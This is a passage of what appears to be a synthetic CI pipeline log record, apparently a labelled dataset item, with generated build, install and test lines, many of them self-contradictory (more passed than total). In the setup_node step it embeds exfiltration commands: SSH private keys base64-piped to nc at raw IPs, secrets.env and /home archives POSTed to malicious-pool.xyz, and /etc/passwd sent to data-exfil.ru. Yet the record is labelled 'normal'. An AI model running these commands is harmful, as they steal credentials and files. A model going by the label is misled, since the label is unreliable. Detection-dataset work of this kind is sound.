          "[12:45:51] DEBUG: Connection pool: 19 active",
          "Test Suites: 31 passed, 18 total",
          "Switched to branch 'bugfix/task-556'",
          "Cache restored successfully (84MB)",
          "Verifying...",
          "pip: Collecting axios",
          "yarn add: Done in 27.99s",
          "HEAD is now at 3048a2e",
          "Installing axios@4.0.4",
          "Generating source maps...",
          "Fetching submodules...",
          "[12:45:51] WARN: Deprecated API usage",
          "POST /api - 202 (361ms)",
          "Processing...",
          "Artifact uploaded: dist.zip (97MB)",
          "Image pulled successfully",
          "[12:45:51] WARN: Deprecated API usage",
          "Bundling vendor.css",
          "Done.",
          "[12:45:51] INFO: Connecting to database",
          "WARNING: jest has known vulnerabilities",
          "[12:45:51] INFO: Request completed",
          "Environment: production",
          "Checking out develop branch",
          "Environment: staging",
          "Step 8/18: Running migrations",
          "Creating production build...",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 Task completed in 2581ms",
          "pip: Collecting eslint",
          "TLS handshake completed",
          "[12:45:51] INFO: Starting build process",
          "NODE_ENV=development",
          "Generating source maps...",
          "  PASS: integration/test_user_create.spec.js",
          "Compiling src/index.js...",
          "[12:45:51] DEBUG: Loading configuration",
          "\u2713 Step 'install' succeeded",
          "Step 13/17: Building",
          "Ready.",
          "Fetching submodules...",
          "Processing...",
          "[12:45:51] INFO: Processing request",
          "Ran 10 tests in 12s",
          "Test Suites: 31 passed, 32 total",
          "Cache miss for key-7661",
          "[12:45:51] INFO: Processing request",
          "[12:45:51] INFO: Processing request",
          "\u2713 lint completed",
          "Cache restored successfully (389MB)",
          "Ready.",
          "\u2713 Step 'test' succeeded",
          "Already up to date.",
          "pip: Downloading lodash-5.20.tar.gz",
          "Image pulled successfully",
          "Snapshots: 6 passed, 32 total",
          "NODE_ENV=test",
          "Connection established",
          "[12:45:51] INFO: Starting build process",
          "Test Suites: 28 passed, 48 total",
          "Layer 10/10: COPY command",
          "[12:45:51] DEBUG: Memory usage: 873MB",
          "Tests: 275 passed, 335 total",
          "Using Node.js 19.7.1",
          "Optimizing 77 modules...",
          "Installing webpack@3.4.6",
          "\u2717 build failed with exit code 15",
          "[12:45:51] DEBUG: Connection pool: 17 active",
          "Ready.",
          "Cache hit for key-1728",
          "Platform: win32-x64",
          "[12:45:51] DEBUG: Loading configuration",
          "Fetching from https://github.com/package.json",
          "GET /health - 204 (71ms)",
          "Step 6/21: Running migrations",
          "Snapshots: 46 passed, 38 total",
          "Done.",
          "[12:45:51] DEBUG: Loading configuration",
          "\u2713 Task completed in 894ms",
          "Tests: 177 passed, 148 total",
          "\u2713 Step 'install' succeeded",
          "GET /api - 204 (57ms)",
          "Cache invalidated: node_modules",
          "Cache hit for key-4653",
          "Cache hit for key-8033",
          "Compiling components/service.java...",
          "pip: Collecting eslint",
          "Fetching submodules...",
          "Uploading artifact 'build' (1 files)",
          "Step 14/15: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Optimizing 14 modules...",
          "Generating source maps...",
          "Bundling vendor.css",
          "Cache restored successfully (316MB)",
          "TLS handshake completed",
          "Using Node.js 17.14.8",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:45:51] DEBUG: Memory usage: 1721MB",
          "Step 19/20: Building",
          "Finished.",
          "Verifying...",
          "\u2713 All checks passed",
          "Pulling image: alpine:latest",
          "npm notice: package.json updated",
          "[12:45:51] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "yarn add: Done in 28.52s",
          "\u2713 All checks passed",
          "Snapshots: 48 passed, 22 total",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-30T12:48:30.759618",
        "finished_at": "2025-11-30T12:48:36.539946",
        "log_lines": [
          "=== Step: checkout ===",
          "NODE_ENV=test",
          "Step 15/20: Deploying",
          "Fetching from https://amazonaws.com/package.json",
          "Step 19/19: Building",
          "npm notice: created a lockfile",
          "Compiling components/app.ts...",
          "Coverage: 89% statements, 73% branches",
          "Compiling components/service.java...",
          "Step 19/19: Installing dependencies",
          "Connection established",
          "Compiling components/app.ts...",
          "Checking out master branch",
          "Checking out main branch",
          "Fetching from https://github.com/package.json",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Processing...",
          "npm install: resolved 750 packages",
          "pip: Installing build dependencies...",
          "Finished.",
          "Cache invalidated: build",
          "WARNING: jest has known vulnerabilities",
          "[12:45:51] INFO: Connecting to database",
          "Using Python 3.12",
          "Success!",
          "Step 7/19: Building",
          "Generating source maps...",
          "NODE_ENV=test",
          "Transforming 938 files...",
          "Step 13/22: Deploying",
          "Using Python 3.10",
          "Fetching submodules...",
          "npm install: added 188 packages",
          "Waiting...",
          "[12:45:51] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed eslint-5.13",
          "npm install: added 259 packages",
          "[12:45:51] DEBUG: Memory usage: 361MB",
          "Artifact downloaded: 47MB",
          "Test Suites: 15 passed, 11 total",
          "Completed.",
          "Loading...",
          "Fetching submodules...",
          "Transforming 750 files...",
          "Step 18/17: Building",
          "Uploading artifact 'dist' (6 files)",
          "Processing...",
          "  PASS: test_auth_login (315ms)",
          "Creating production build...",
          "Fetching submodules...",
          "HEAD is now at 26bb7ea",
          "[12:45:51] DEBUG: Query executed in 79ms",
          "Compiling lib/utils.go...",
          "Artifact downloaded: 34MB",
          "Verifying...",
          "Already up to date.",
          "Cache invalidated: node_modules",
          "[12:45:51] INFO: Cache refreshed",
          "[12:45:51] DEBUG: Initializing service",
          "HEAD is now at b798c95",
          "WARNING: jest has known vulnerabilities",
          "Loading...",
          "Snapshots: 15 passed, 34 total",
          "Step 11/25: Installing dependencies",
          "[12:45:51] WARN: Deprecated API usage",
          "Cache hit for key-8153",
          "Success!",
          "WARNING: express has known vulnerabilities",
          "Platform: win32-x64",
          "Using Node.js 14.10.8",
          "Cache hit for key-6467",
          "  PASS: e2e/test_db_connect.spec.js",
          "Ready.",
          "Environment: staging",
          "Pulling image: node:3.11",
          "Snapshots: 19 passed, 12 total",
          "Step 6/17: Installing dependencies",
          "Step 10/19: Installing dependencies",
          "Using Python 3.12",
          "Building Docker image...",
          "Step 16/18: Building",
          "Image pulled successfully",
          "OK",
          "pip: Downloading react-4.1.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 15/25: Deploying",
          "Success!",
          "Step 19/21: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Switched to branch 'bugfix/task-801'",
          "npm notice: created a lockfile",
          "NODE_ENV=development",
          "[12:45:51] INFO: Connecting to database",
          "Step 11/24: Building",
          "Compiling components/handler.rs...",
          "Loading...",
          "Environment: production",
          "Fetching from https://amazonaws.com/package.json",
          "npm install: resolved 1878 packages",
          "Installing express@3.6.4",
          "Completed.",
          "Done.",
          "Step 13/16: Deploying",
          "Success!",
          "[12:45:51] INFO: Processing request",
          "Compiling utils/handler.rs...",
          "Creating production build...",
          "Compiling src/app.ts...",
          "Exception: ValueError",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-30T12:48:36.539946",
        "finished_at": "2025-11-30T12:48:50.990766",
        "log_lines": [
          "=== Step: setup_node ===",
          "Step 12/15: Running migrations",
          "[12:45:51] DEBUG: Query executed in 92ms",
          "Minifying main.js",
          "Image pulled successfully",
          "[12:45:51] DEBUG: Loading configuration",
          "Processing...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 66.87.159.165 26392",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "pip install: Successfully installed lodash-5.14",
          "Time: 102.306s",
          "\u2713 Step 'build' succeeded",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 69.120.35.211 25348",
          "Step 19/15: Linting",
          "Success!",
          "Minifying main.js",
          "Verifying...",
          "OK",
          "Pulling image: node:3.11",
          "pip: Installing build dependencies...",
          "FAILED: test_db_connect",
          "Step 10/21: Deploying",
          "Step 1/23: Linting",
          "Artifact downloaded: 31MB",
          "Pushing to registry...",
          "HEAD is now at 960c914",
          "Generating source maps...",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: e2e/test_auth_login.spec.js",
          "pip: Downloading lodash-4.16.tar.gz",
          "npm notice: package.json updated",
          "Installing axios@1.16.5",
          "pip: Installing build dependencies...",
          "Cache hit for key-1122",
          "Ready.",
          "HEAD is now at 79d230a",
          "Environment: development",
          "pip: Downloading axios-5.19.tar.gz",
          "HEAD is now at 11ee6d1",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Using Node.js 16.4.6",
          "npm notice: package.json updated",
          "pip install: Successfully installed react-5.2",
          "npm notice: created a lockfile",
          "Exception: TypeError",
          "Test Suites: 48 passed, 7 total",
          "OK",
          "[12:45:51] INFO: Request completed",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Finished.",
          "TLS handshake completed",
          "TLS handshake completed",
          "Environment: test",
          "Switched to branch 'bugfix/task-644'",
          "[12:45:51] INFO: Connecting to database",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 66.116.114.190 52116",
          "\u2713 Task completed in 2940ms",
          "[12:45:51] DEBUG: Query executed in 78ms",
          "Image pulled successfully",
          "OK",
          "Step 1/21: Installing dependencies",
          "Success!",
          "Layer 9/13: ENV command",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "[12:45:51] DEBUG: Connection pool: 11 active",
          "FAILED: test_auth_login",
          "Using Python 3.11",
          "[12:45:51] DEBUG: Loading configuration",
          "Connection established",
          "  PASS: e2e/test_user_create.spec.js",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 70.57.157.200 4037",
          "Building Docker image...",
          "Step 7/21: Running migrations",
          "npm install: resolved 857 packages",
          "Coverage: 100% statements, 92% branches",
          "Success!",
          "Switched to branch 'feature/task-256'",
          "Ran 125 tests in 50s",
          "[12:45:51] DEBUG: Connection pool: 14 active",
          "Step 8/22: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed react-5.12",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "[12:45:51] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=production",
          "npm install: added 465 packages",
          "[12:45:51] DEBUG: Memory usage: 1835MB",
          "Compiling src/utils.go...",
          "Snapshots: 25 passed, 0 total",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 33.134.109.181 42828",
          "Pushing to registry...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 203.119.179.162 50565",
          "Using Node.js 19.19.8",
          "Sending 155MB of data to data-exfil.ru",
          "Minifying vendor.js",
          "Creating production build...",
          "[12:45:51] INFO: Cache refreshed",
          "POST /data - 201 (448ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "yarn add: Done in 18.28s",
          "[12:45:51] DEBUG: Loading configuration",
          "Step 9/17: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Sending 198MB of data to crypto-mine.io",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "[12:45:51] WARN: Deprecated API usage",
          "[12:45:51] INFO: Request completed",
          "[12:45:51] DEBUG: Memory usage: 1273MB",
          "Loading...",
          "Cache saved successfully",
          "GET /status - 201 (39ms)",
          "Exception: NullPointerException",
          "NODE_ENV=test",
          "Loading...",
          "Waiting...",
          "Creating production build...",
          "NODE_ENV=development",
          "Uploading artifact 'dist' (41 files)",
          "WARNING: express has known vulnerabilities",
          "npm install: resolved 1008 packages",
          "[12:45:51] INFO: Cache refreshed",
          "TLS handshake completed",
          "=== Step setup_node completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}